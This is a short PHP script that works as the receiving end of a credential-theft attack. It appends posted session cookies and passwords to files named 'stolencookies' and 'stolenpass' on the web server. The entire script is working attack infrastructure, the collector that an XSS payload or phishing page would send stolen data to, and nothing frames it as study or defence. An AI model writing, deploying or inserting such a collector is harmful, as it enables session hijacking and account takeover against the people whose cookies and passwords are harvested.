<?php
    $f = fopen("/var/www/stolencookies", "a+");
    fwrite($f, $_POST['cookie'] . "\n");
    fclose($f);

    $f = fopen("/var/www/stolenpass", "a+");
    fwrite($f, $_POST['passwords'] . "\n");
    fclose($f);
?>